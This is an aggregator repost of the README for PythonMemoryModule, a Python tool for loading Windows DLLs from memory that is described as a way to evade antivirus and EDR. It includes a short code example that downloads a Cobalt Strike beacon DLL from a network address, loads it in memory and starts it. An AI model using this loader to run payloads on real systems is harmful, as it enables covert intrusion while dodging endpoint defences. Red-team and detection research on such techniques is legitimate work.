---
title: timwhitez starred PythonMemoryModule
url: https://buaq.net/go-144470.html
source: unSafe.sh - 不安全
date: 2023-01-07
fetch_date: 2025-10-04T03:13:41.434875
---

# timwhitez starred PythonMemoryModule

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/1be3b28878e71039f296456d5f71dbdd.jpg)

timwhitez starred PythonMemoryModule

pure-python implementation of MemoryModule technique to load a dll entirely from memor
*2023-1-6 18:44:8
Author: [github.com(查看原文)](/jump-144470.htm)
阅读量:31
收藏*

---

pure-python implementation of MemoryModule technique to load a dll entirely from memory

[![immagine](https://user-images.githubusercontent.com/59816245/210533889-424707d3-2c82-4ca3-afaf-cc19857fa2d6.png)](https://user-images.githubusercontent.com/59816245/210533889-424707d3-2c82-4ca3-afaf-cc19857fa2d6.png)

PythonMemoryModule is a Python ctypes porting of the [MemoryModule](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) technique originally published by [Joachim Bauch](https://github.com/fancycode/MemoryModule). It can load a dll using Python without requiring the use of an external library (pyd).
It leverages [pefile](https://github.com/erocarrera/pefile) to parse PE headers and ctypes.

The tool was originally thought to be used as a [Pyramid](https://github.com/naksyn/Pyramid/) module to provide evasion against AV/EDR by loading dll payloads in python.exe entirely from memory, however other use-cases are possible (IP protection, pyds in-memory loading, spinoffs for other stealthier techniques) so I decided to create a dedicated repo.

1. It basically allows to use the MemoryModule techinque entirely in Python interpreted language, enabling the loading of a dll from a memory buffer using the stock signed python.exe binary without requiring dropping on disk external code/libraries (such as [pymemorymodule](https://pypi.org/project/pymemorymodule/) bindings) that can be flagged by AV/EDRs or can raise user's suspicion.
2. Using MemoryModule technique in compiled languages loaders would require to embed MemoryModule code within the loaders themselves. This can be avoided using Python interpreted language and PythonMemoryModule since the code can be executed dynamically and in memory.
3. you can get some level of Intellectual Property protection by dynamically in-memory downloading, decrypting and loading dlls that should be hidden from prying eyes. Bear in mind that the dlls can be still recovered from memory and reverse-engineered, but at least it would require some more effort by the attacker.
4. you can load a stageless payload dll without performing injection or code execution. The loading process mimics the LoadLibrary Windows API (which takes a path on disk as input) without actually calling it and operating in memory.

In the following example a Cobalt Strike stageless beacon dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint.

```
import urllib.request
import ctypes
import pythonmemorymodule
request = urllib.request.Request('http://192.168.1.2/beacon.dll')
result = urllib.request.urlopen(request)
buf=result.read()
dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
startDll = dll.get_proc_addr('StartW')
assert startDll()
#dll.free_library()
```

Note: if you use staging in your malleable profile the dll would not be able to load with LoadLibrary, hence MemoryModule won't work.

[![](https://github.com/naksyn/PythonMemoryModule/raw/main/MemoryModuleCS.gif)](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif)

Using the MemoryModule technique will mostly respect the sections' permissions of the target DLL and avoid the noisy RWX approach. However within the program memory there will be a private commit not backed by a dll on disk and this is a MemoryModule telltale.

文章来源: https://github.com/naksyn/PythonMemoryModule
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)